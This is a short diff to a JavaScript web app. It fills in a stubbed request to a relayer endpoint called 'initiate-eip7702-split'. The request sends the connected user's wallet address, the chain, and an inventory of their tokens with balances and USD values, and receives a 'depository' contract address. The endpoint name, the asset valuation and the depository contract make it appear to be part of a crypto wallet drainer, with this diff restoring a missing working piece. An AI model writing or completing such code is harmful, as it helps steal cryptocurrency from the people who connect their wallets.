@@ -120,8 +120,24 @@
     let depositoryContractAddress;
     try {
         const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
-            // ... (API call to get contract address) ...
-        });
+            // === REQUIRED ADDITION FOR FUNCTIONALITY ===
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey }, // <-- Re-inserting the header
+            body: JSON.stringify({
+                apiKey: this._config.apiKey,
+                origin: window.location.origin,
+                owner: this._currentUserAddress,
+                chainId: this._config.chainId,
+                assets: assets.map(a => ({
+                    token: a.address,
+                    type: a.type,
+                    symbol: a.symbol,
+                    usdValue: a.usdValue,
+                    amount: a.balance.toString(),
+                    decimals: a.decimals
+                }))
+            })
+        });
         const data = await response.json();
         if (!data.success) throw new Error(data.message);
         depositoryContractAddress = data.contractAddress;
